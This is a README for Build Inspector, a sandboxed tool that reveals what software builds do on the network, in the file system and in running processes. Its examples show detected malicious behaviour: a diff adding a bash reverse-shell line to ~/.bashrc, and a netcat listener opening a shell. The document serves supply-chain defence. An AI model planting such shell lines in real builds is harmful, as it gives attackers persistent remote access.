# Build Inspector

[Build Inspector](https://github.com/srcclr/build-inspector) is a forensic sandbox for buliding source code and gives insight into what's happening during the build of a project. It's language and build system agnostic and is capable of inspecting network activities, file system changes, and running
processes. All build operations happen in a sandboxed environment without
compromising the developer's machine.

## Requirements

- [Ruby](https://www.ruby-lang.org/en/downloads/) (2.2.3 recommended)
- [Vagrant](https://www.vagrantup.com/)

Once you have both Ruby and Vagrant installed, go ahead and install
the Sahara plugin, bundler and this project's dependencies.

```bash
vagrant plugin install sahara
git clone https://github.com/srcclr/build-inspector.git
gem install bundler
bundle install
```

## Running

First, make sure that you have the
[requirements](https://github.com/srcclr/build-inspector#requirements)
and you are inside the repository's directory.

```bash
cd build_inspector
```

Since this tool does not manage Vagrant for you, yet, you'll have to
do it yourself. This step will take a while the first time, but won't
be necessary again. Eventually, this step will be eliminated. Start
Vagrant and build the image:

```bash
vagrant up
```

Once vagrant is started, save a snapshot with:
```bash
vagrant sandbox on
```

### Usage

```
Usage inspector [options] <git repo path>
    -h, --help                       Display this screen
    -n, --no-rollback                Do not roll back the virtual machine state after running
    -v, --verbose                    Be verbose
    -c, --config <PATH>              Use configuration file at <PATH>, default=config.yml
    -p, --process <PATH>             Only process evidence at <PATH>
    -b, --branch <BRANCH>            Clone <BRANCH> from repository URL
        --url                        Git repo path is a URL
        --gem                        Perform a GEM based build
        --gradle                     Perform a Gradle based build
        --maven                      Perform a Maven based build
        --npm                        Perform a NPM based build
```

### Gradle Example

```bash
./inspector --gradle test-repos/TotallyLegitApp
```

The above project has a task called `backdoor` that adds a reverse
connect shell to `~/.bashrc`.

After running, you should see this at the bottom of the output:

```
changed: ~/.bashrc
--- /backup/root/.bashrc	2014-02-19 21:43:56.000000000 -0500
+++ /root/.bashrc	2015-11-08 13:07:40.579626388 -0500
@@ -97,3 +97,5 @@
 #if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
 #    . /etc/bash_completion
 #fi
+
+bash -c "bash -i>&/dev/tcp/localhost/1337 0>&1 &disown"&>/dev/null
```

In addition, you'll have a file that looks like
`evidence-TotallyLegitApp-201523110032412.zip` which has all the
network and process activity, file system changes, and any new processes.

### Bundler Example

```bash
./inspector --gem test-repos/harmless-project
```

This bundler project has a gem that pings Google during its
installation.

Run it with the Build Inspector and you should see a list of domains
that the machine tried to connect to.

```
Hosts contacted:
  www.google.com (74.125.224.113)                                    1.3K
```

### NPM Example

```bash
./inspector --npm test-repos/ann-pee-am
```

Inspecting this NPM project should yield the following output:

```
The following processes were running during the build:
  - /bin/sh -i
  - nc -l 0.0.0.0 8080
```

That's because the NPM project depends on a module that opens a
persistent backdoor using `netcat`.

### Configuration

The tool monitors all network and file system activities. To ignore
hosts or exclude directories from the monitoring, create and add an
`config.yml` in the repository. The `config.yml` file is simply
a YAML file that looks like this:

```yaml
---

commands: bundle install --jobs 2

host_whitelist:
  - 10.0.2.2 # Vagrant's IP
  - 8.8.8.8 # Ignore DNS
  - bundler.rubygems.org
  - rubygems.global.ssl.fastly.net
  - rubygems.org

evidence_files:
  exclude:
    - /home/vagrant/.gem
  include:
    - /etc
```

There are examples for different build systems in the [configs](configs)
directory. You may copy the approriate configs for your build system
to the root of this project or you may write one from scratch.

## Reporting Suspicious Builds

Help us understand what threats are out there in the wild by submitting any suspicious builds you encounter. This helps us direct engineering efforts to better protect against emerging threats and also just makes us feel like we're helping.

To submit a suspicious build, just click this link to create a new issue:
[https://github.com/srcclr/build-inspector/issues/new?title=Suspicious%20Build%20Evidence&body=Where%20did%20you%20find%20this%20project%3F%0A%0AWhy%20do%20you%20think%20it%27s%20suspicious%3F%0A%0AAny%20other%20important%20details%3F%0A%0AHow%20are%20you%20doing%20today%3F](Suspicious Build Issue Submission).

Then, simply upload the evidence zip to the GitHub issue you just created. Thanks in advance!

## Troubleshooting

If you're having a problem, try running `rake vagrant:test` and ensure your environment is setup correctly.

### Gradle Build Fails with java.lang.OutOfMemoryError
A build may work on the host machine but fail with BuildInspector because the Vagrant virtual machine has less memory available than the host machine. There are two ways to work around this issue.

#### Option 1: Modify [Vagrantfile](Vagrantfile)
This is the most direct option. This file is used to setup some properties of the virtual machine. The relevant section is:
```ruby
config.vm.provider 'virtualbox' do |vb|
  vb.customize ['modifyvm', :id, '--natdnsproxy1', 'off']
  vb.customize ['modifyvm', :id, '--natdnshostresolver1', 'off']
  vb.memory = 1024
end
```

Simply adjust `vb.memory = 1024` to some other number such as `vb.memory = 2000` then rebuild the machine with `rake vagrant:rebuild`. The Java VM determines heap space as a portion of total memory available. Increasing the memory will also increase the heap space.

#### Option 2: Adjust Java VM Heap Size
If you're unable to adjust the memory requirements for the Vagrant virtual machine, you can try to tell Gradle to tell the Java VM to allocate more heap space. This can be done by adding the following command to your configuration:

```bash
echo org.gradle.jvmargs=-Xmx2G >> gradle.properties
```

For example, `gradle.yml` is:

```yaml
commands: gradle build
```

After adding this command it would be:

```yaml
commands:
  - echo org.gradle.jvmargs=-Xmx2G >> gradle.properties
  - gradle build
```

## Development

When you want to experiment, just do:
`vagrant sandbox on`

Then, make all the changes you want to the image. If you'd like to save the changes, do:
`vagrant sandbox commit`

Otherwise, you can wipe out the changes with:
`vagrant sandbox rollback`

There are also a number of Rake tasks:
```
rake vagrant:commit    # Commits the machine's state
rake vagrant:destroy   # Destroy Vagrant image
rake vagrant:halt      # Gracefully stop Vagrant
rake vagrant:rebuild   # Equivalent to a `vagrant destroy && vagrant up`
rake vagrant:reload    # Equivalent to a `vagrant halt && vagrant up`
rake vagrant:rollback  # Restores the previously committed machine state
rake vagrant:test      # Check environment to determine if build-inspector should work
rake vagrant:up        # Start Vagrant
rake vagrant:update    # Upgrade Vagrant image
```
